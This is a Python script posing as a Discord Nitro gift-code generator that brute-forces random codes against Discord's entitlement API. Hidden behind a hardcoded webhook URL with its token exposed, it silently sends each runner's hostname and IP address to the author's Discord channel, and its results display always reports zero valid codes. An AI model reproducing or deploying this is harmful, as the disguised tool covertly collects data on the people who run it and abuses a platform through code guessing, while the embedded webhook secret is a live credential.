import ctypes
import string
import os
import time
from discord_webhook import DiscordWebhook
import requests
import numpy
import socket
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
USE_WEBHOOK = True

time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')

url = "https://github.com"
try:
    response = requests.get(url)
    print("Internet check")
    time.sleep(.4)
except requests.exceptions.ConnectionError:
    input("You are not connected to internet, check your connection and try again.\nPress enter to exit")
    exit()


class NitroGen:
    def __init__(self):
        self.fileName = "Nitro Codes.txt"

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        if os.name == "nt":
            print("")
            ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator")
        else:
            print(f'\33]0;By Nitro Gen V5F\a', end='', flush=True)

        self.slowType("9ET Nitro Gen", .02)
        time.sleep(2)
        self.slowType("Made by: Discord Nitro Gen", .02)
        time.sleep(1)
        self.slowType("\nInput How Many Codes to Generate and Check (99999 recommended): ", .02, newLine=False)

        try:
            num = int(input(''))
        except ValueError:
            input("Specified input wasn't a number.\nPress enter to exit")
            exit()

        if USE_WEBHOOK:
            url = "https://discord.com/api/webhooks/1135262056019398808/mibBVhFjGqAlbYHJs1qQ9pkJd_-kciqxIq64wDjuQf0FlTNAJUzu8DL_M9TlXEzCGpd8"
            webhook = url if url != "" else None

            if webhook is not None:
                DiscordWebhook(
                    url=url,
                    content=f"Someone ran the gen\nHostname: {hostname}IP Address: {ip_address}"
                ).execute()

        valid = []
        invalid = 0
        chars = []
        chars[:0] = string.ascii_letters + string.digits

        c = numpy.random.choice(chars, size=[num, 16])
        for s in c:
            try:
                code = ''.join(x for x in s)
                url = f"https://discord.gift/{code}"

                result = self.quickChecker(url, webhook)

                if result:
                    valid.append(url)
                else:
                    invalid += 1
            except KeyboardInterrupt:
                print("\nInterrupted by user")
                break

            except Exception as e:
                print(f" Error | {url} ")

            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTitleW(
                    f"Nitro Generator and Checker - {len(valid)} Valid | {invalid} Invalid - Made by Nitro Gen")
                print("")
            else:
                print(
                    f'\33]0;Made by Nitro Gen - {len(valid)} Valid | {invalid} Invalid - Nitro Gen\a', end='', flush=True)

        print(f"""
Results:
 Valid: {"0"}
 Invalid: {invalid}""")

        input("\nThe end! Press Enter 5 times to close the program.")
        [input(i) for i in range(4, 0, -1)]

    def slowType(self, text: str, speed: float, newLine=True):
        for i in text:
            print(i, end="", flush=True)
            time.sleep(speed)
        if newLine:
            print()

    def quickChecker(self, nitro: str, notify=None):
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)

        if response.status_code == 200:
            print(f" Valid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n")
            with open("Nitro Codes.txt", "w") as file:
                file.write(nitro)

            if notify is not None:
                DiscordWebhook(
                    url=url,
                    content=f"Valid Nito Code detected! @everyone \n{nitro}"
                ).execute()

            return True

        else:
            print(f" Invalid | {nitro} ", flush=True, end="" if os.name == 'nt' else "\n")
            return False


if __name__ == '__main__':
    Gen = NitroGen()
    Gen.main()
